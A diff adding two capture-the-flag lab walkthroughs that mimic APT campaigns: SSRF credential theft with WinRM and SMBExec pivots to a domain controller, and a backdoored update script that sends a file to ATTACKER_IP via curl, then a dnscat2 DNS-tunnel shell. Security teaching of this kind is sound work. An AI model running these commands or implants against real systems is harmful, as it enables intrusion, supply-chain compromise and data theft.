@@ -3183,3 +3183,407 @@ curl -s http://LLM_SERVER_IP:PORT/history/PRIVILEGED_USER_ID \
 ```
 **Expected Output:** `CTF{...flag_value_placeholder...}`
 **TTP:** —
+
+---
+
+## Multi-Step ATP Chain Kill-Chains
+
+Multi-step ATP scenarios simulate real-world APT (Advanced Persistent Threat) campaigns.
+Each scenario has exactly two flags placed at lateral movement boundaries. The first flag
+is captured after the initial foothold and first lateral movement hop; the second flag
+is captured after the second lateral movement hop using a distinct protocol. All ATP
+kill-chains use VM role labels per §1.3 ([PivotHost], [DC], [AttackerVM]).
+
+---
+
+### ATP-01: HAFNIUM-Style SSRF Pivot to Domain Controller
+
+**VMs:** Attacker (Kali), Pivot Server (Ubuntu 22.04, Flask app + internal credential endpoint), DC (Windows Server 2019, `corp.local`)
+**Difficulty:** Hard
+**Flags:** 2
+
+This scenario simulates the HAFNIUM campaign pattern — exploiting a web application SSRF
+vulnerability to steal internal credentials, then using those credentials to pivot laterally
+across two hosts via distinct protocols. The student chains SSRF-to-credential-theft (HTTP),
+WinRM lateral movement to the pivot host, and SMB-based lateral movement to the Domain
+Controller.
+
+---
+
+#### Stage 1: Web Application Reconnaissance [PivotHost]
+
+**Action:** You enumerate the Flask web application on the pivot server to identify the
+SSRF-vulnerable endpoint and map internal services reachable from the server.
+
+**Command:**
+```bash
+nmap -sV -p 80,8080,5000,443 PIVOT_HOST_IP
+
+curl -s http://PIVOT_HOST_IP:5000/
+
+# Discover the vulnerable endpoint:
+curl -s "http://PIVOT_HOST_IP:5000/fetch?url=http://127.0.0.1:5000/"
+```
+
+**Expected Output:** Flask app responding on port 5000. The `/fetch?url=` endpoint
+returns content from the URL parameter without validation, confirming SSRF.
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 2: SSRF Exploitation — Internal Credential Store Enumeration [PivotHost]
+
+**Action:** You exploit the SSRF endpoint to reach the internal credential store endpoint
+(not directly accessible from the internet) and steal the Windows pivot host service
+account credentials.
+
+**Command:**
+```bash
+# Probe internal services via SSRF:
+curl -s "http://PIVOT_HOST_IP:5000/fetch?url=http://127.0.0.1:8000/"
+
+# Access the internal credential endpoint:
+curl -s "http://PIVOT_HOST_IP:5000/fetch?url=http://127.0.0.1:8000/config/credentials"
+
+# Alternative — enumerate common internal ports if the above fails:
+for port in 8000 8080 8888 9000 3000; do
+  echo -n "port=$port: "
+  curl -s "http://PIVOT_HOST_IP:5000/fetch?url=http://127.0.0.1:$port/" | head -c 80
+  echo
+done
+```
+
+**Expected Output:**
+```
+{"host": "WINRM_HOST_IP", "username": "svc_deploy", "password": "Winter2024!"}
+```
+(representative — shows credential JSON returned by the internal config endpoint)
+
+**TTP:** [T1078.001 — Default Accounts](https://attack.mitre.org/techniques/T1078/001/) · Defense Evasion · [T1602 — Data from Configuration Repository](https://attack.mitre.org/techniques/T1602/) · Collection
+
+---
+
+#### Stage 3: First Lateral Movement — WinRM to Pivot Windows Host [PivotHost]
+
+**Action:** You use the harvested credentials to authenticate to the Windows pivot host
+via WinRM, establishing an interactive PowerShell session as the service account.
+
+**Command:**
+```bash
+# Verify WinRM access before opening shell:
+nxc winrm WINRM_HOST_IP -u svc_deploy -p 'HARVESTED_PASSWORD'
+
+# Open interactive shell:
+evil-winrm -i WINRM_HOST_IP -u svc_deploy -p 'HARVESTED_PASSWORD'
+```
+
+**Expected Output:**
+```
+Evil-WinRM shell v3.x
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
+```
+
+**TTP:** [T1021.006 — Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) · Lateral Movement
+
+---
+
+#### Stage 4: Pivot Host Enumeration — Domain Credential Discovery [PivotHost]
+
+**Action:** You enumerate the Windows pivot host filesystem and configuration files for
+stored domain credentials that can be leveraged for the second lateral movement hop.
+
+**Command:**
+```bash
+# In the evil-winrm shell — search for credential files:
+dir C:\inetpub\ /s /b | findstr /i "web.config password.txt creds"
+
+# Read the web application config for DB/domain credentials:
+type C:\inetpub\wwwroot\web.config
+
+# Check scheduled tasks for stored credentials:
+schtasks /query /fo LIST /v | findstr /i "run as\|password"
+```
+
+**Expected Output:** A `web.config` or credential file exposing a domain account password
+usable for SMB access to the DC (e.g., `<add key="DomainPass" value="Adm1n@corp"/>`).
+
+**TTP:** [T1552.001 — Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) · Credential Access
+
+---
+
+### [FLAG 1] Stage 5: Flag Capture — Pivot Host Filesystem [PivotHost]
+
+**Action:** You retrieve Flag 1 from the Windows pivot host filesystem, confirming
+successful first-hop lateral movement via WinRM using SSRF-stolen credentials.
+
+**Command:**
+```bash
+# In the evil-winrm shell:
+type C:\Users\svc_deploy\Desktop\flag1.txt
+
+# Alternative if flag is not on the Desktop:
+dir C:\ /s /b | findstr "flag1.txt"
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** —
+
+---
+
+#### Stage 6: Second Lateral Movement — SMBExec to Domain Controller [DC]
+
+**Action:** You use the domain credentials discovered on the pivot host to execute commands
+on the Domain Controller via SMBExec, completing the HAFNIUM-style two-hop lateral movement
+chain with a distinct protocol from the first hop.
+
+**Command:**
+```bash
+# From attacker VM — verify SMB access to the DC first:
+nxc smb DC_IP -u DOMAIN_ADMIN -p 'DOMAIN_PASSWORD'
+
+# Open semi-interactive shell via smbexec.py (Impacket):
+smbexec.py CORP.LOCAL/DOMAIN_ADMIN:'DOMAIN_PASSWORD'@DC_IP
+```
+
+**Expected Output:**
+```
+Impacket v0.x - Copyright ...
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+```
+
+**TTP:** [T1021.002 — Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/) · Lateral Movement
+
+---
+
+### [FLAG 2] Stage 7: Flag Capture — Domain Controller Filesystem [DC]
+
+**Action:** You retrieve Flag 2 from the Domain Controller filesystem via the SMBExec
+shell, completing the HAFNIUM-style ATP chain.
+
+**Command:**
+```bash
+# In the smbexec.py shell:
+type C:\Users\Administrator\Desktop\flag2.txt
+
+# Alternative if flag is not on the Desktop:
+dir C:\ /s /b | findstr "flag2.txt"
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** —
+
+---
+
+### ATP-02: SolarWinds-Style Supply Chain Compromise + DNS C2
+
+**VMs:** Attacker (Kali), Update Server (Ubuntu 22.04, nginx serving update packages), Target (Ubuntu 22.04, cron job polling update server)
+**Difficulty:** Hard
+**Flags:** 2
+
+This scenario simulates the SolarWinds supply chain attack pattern — the student compromises
+the software update distribution server and replaces the legitimate update package with a
+backdoored one, which executes automatically on the downstream target when its scheduled
+update poll fires. After establishing a foothold via the backdoored update, the student sets
+up a covert command-and-control channel using DNS tunneling (dnscat2) to reach an isolated
+final target and retrieve the second flag.
+
+---
+
+#### Stage 1: Update Server Reconnaissance and Tarball Discovery [UpdateSrv]
+
+**Action:** You enumerate the nginx update server to identify the directory structure,
+locate the legitimate update package, and understand the update delivery mechanism.
+
+**Command:**
+```bash
+nmap -sV -p 80,443,8080 UPDATE_SERVER_IP
+
+curl -s http://UPDATE_SERVER_IP/
+
+# List available update packages:
+curl -s http://UPDATE_SERVER_IP/updates/
+
+# Download the legitimate update script to inspect its structure:
+curl -O http://UPDATE_SERVER_IP/updates/update.sh
+cat update.sh
+```
+
+**Expected Output:** nginx directory listing showing `update.sh` (the update script polled
+by the target VM). Contents of `update.sh` show it runs system configuration steps and
+optionally installs packages, confirming a shell script update mechanism.
+
+**TTP:** [T1592 — Gather Victim Host Information](https://attack.mitre.org/techniques/T1592/) · Reconnaissance
+
+---
+
+#### Stage 2: Backdoored Update Crafting — Supply Chain Implant
+
+**Action:** You craft a backdoored replacement for the legitimate update script that
+executes a flag-reading callback while appearing to perform legitimate update operations,
+exploiting the target's `curl http://UPDATE_SERVER_IP/updates/update.sh | bash` cron job.
+
+**Command:**
+```bash
+cat > backdoor_update.sh << 'EOF'
+#!/bin/bash
+# Legitimate-looking update steps (cover for the implant)
+apt-get update -qq 2>/dev/null
+
+# Implant: read flag and send to attacker callback
+FLAG=$(cat /root/flag1.txt 2>/dev/null || cat /home/ubuntu/flag1.txt 2>/dev/null)
+curl -s "http://ATTACKER_IP:CALLBACK_PORT/flag?data=$FLAG" &
+
+# Continue legitimate update (avoid detection)
+exit 0
+EOF
+chmod +x backdoor_update.sh
+```
+
+Note: The backdoored script blends in with legitimate update activity. The flag-read
+callback fires in the background — the cron job completes normally, masking the
+compromise. This is the supply chain teaching moment: update pipelines that do not verify
+package integrity (no checksum, no signature) are trivially exploitable.
+
+**Expected Output:** `backdoor_update.sh` created and executable (`ls -la backdoor_update.sh` confirms `-rwxr-xr-x`).
+
+**TTP:** [T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain](https://attack.mitre.org/techniques/T1195/002/) · Initial Access
+
+---
+
+#### Stage 3: Update Server File Replacement — Plant the Implant [UpdateSrv]
+
+**Action:** You replace the legitimate update script on the nginx update server with the
+backdoored version and start a callback listener on the attacker VM, completing the supply
+chain implant.
+
+**Command:**
+```bash
+# Scenario starting credential: SSH access as the update server admin
+scp backdoor_update.sh UPDATE_SERVER_ADMIN@UPDATE_SERVER_IP:/var/www/html/updates/update.sh
+
+# Verify replacement (backdoored content served by nginx):
+curl -s http://UPDATE_SERVER_IP/updates/update.sh | head -5
+
+# Start listener for the flag callback on attacker VM:
+nc -lvnp CALLBACK_PORT
+```
+
+**Expected Output:** SCP succeeds silently. Curl confirms the backdoored script is now
+served by nginx (shows `#!/bin/bash` and `apt-get update` header lines). Netcat listener
+starts: `Listening on [0.0.0.0] (family 0, port CALLBACK_PORT)`.
+
+**TTP:** [T1505 — Server Software Component](https://attack.mitre.org/techniques/T1505/) · Persistence
+
+---
+
+### [FLAG 1] Stage 4: Flag Capture — Backdoored Update Execution on Target [Target]
+
+**Action:** You wait for the target's cron job to poll the update server and execute the
+backdoored script, receiving Flag 1 via the HTTP callback on your netcat listener.
+
+**Command:**
+```bash
+# Listener already running from Stage 3. Wait for the cron job (fires every 60 seconds):
+nc -lvnp CALLBACK_PORT
+
+# The target's cron job runs automatically:
+# curl http://UPDATE_SERVER_IP/updates/update.sh | bash
+# which executes the backdoored update.sh and hits the callback.
+```
+
+**Expected Output:**
+```
+Connection received on TARGET_IP PORT
+GET /flag?data=CTF{...flag_value_placeholder...} HTTP/1.1
+```
+
+**TTP:** —
+
+---
+
+#### Stage 5: DNS Tunnel Establishment — dnscat2 C2 Channel [Target]
+
+**Action:** You establish a covert command-and-control channel to the compromised target
+using dnscat2, which encapsulates shell commands inside DNS queries, bypassing network
+controls that block direct TCP connections.
+
+**Command:**
+```bash
+# On attacker VM — start the dnscat2 Ruby server:
+# (Pre-req: Ruby installed; dnscat2 cloned from https://github.com/iagox86/dnscat2)
+cd dnscat2/server && ruby dnscat2.rb --dns "host=ATTACKER_IP,port=53,domain=TUNNEL_DOMAIN" --no-cache
+
+# On the compromised target VM (executed via the netcat reverse shell from Stage 4):
+./dnscat2 TUNNEL_DOMAIN
+
+# Alternative — use the pre-staged compiled Linux client:
+/tmp/dnscat2 ATTACKER_IP
+```
+
+**Expected Output:**
+```
+dnscat2> New session established: 1
+Session 1 Security: ENCRYPTED
+dnscat2>
+```
+
+**TTP:** [T1071.004 — Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/) · Command and Control
+
+---
+
+#### Stage 6: Covert Lateral Movement — dnscat2 Shell to Isolated Target [Target]
+
+**Action:** You use the dnscat2 encrypted DNS shell on the compromised target to enumerate
+and reach the isolated final target on the internal network segment, which is not directly
+reachable from the attacker VM.
+
+**Command:**
+```bash
+# In the dnscat2 server console — open a shell on session 1:
+dnscat2> session -i 1
+command (1)> shell
+
+# In the new shell window — enumerate internal routes and scan for the isolated target:
+ip route
+ip addr
+
+for ip in $(seq 1 254); do
+  ping -c1 -W1 INTERNAL_SUBNET.$ip &>/dev/null && echo "$ip up"
+done
+```
+
+**Expected Output:**
+```
+command (1)> shell
+New window created: 2
+INTERNAL_SUBNET.1 up
+INTERNAL_SUBNET.42 up
+```
+
+**TTP:** [T1090 — Proxy](https://attack.mitre.org/techniques/T1090/) · Command and Control
+
+---
+
+### [FLAG 2] Stage 7: Flag Capture — Isolated Final Target via dnscat2 [Target]
+
+**Action:** You retrieve Flag 2 from the isolated final target through the dnscat2 DNS
+tunnel, completing the SolarWinds-style ATP chain with a covert C2 channel that bypasses
+direct network controls.
+
+**Command:**
+```bash
+# In the dnscat2 shell session (window 2):
+cat /root/flag2.txt
+
+# Alternative if flag location varies:
+find / -name "flag2.txt" 2>/dev/null
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** —
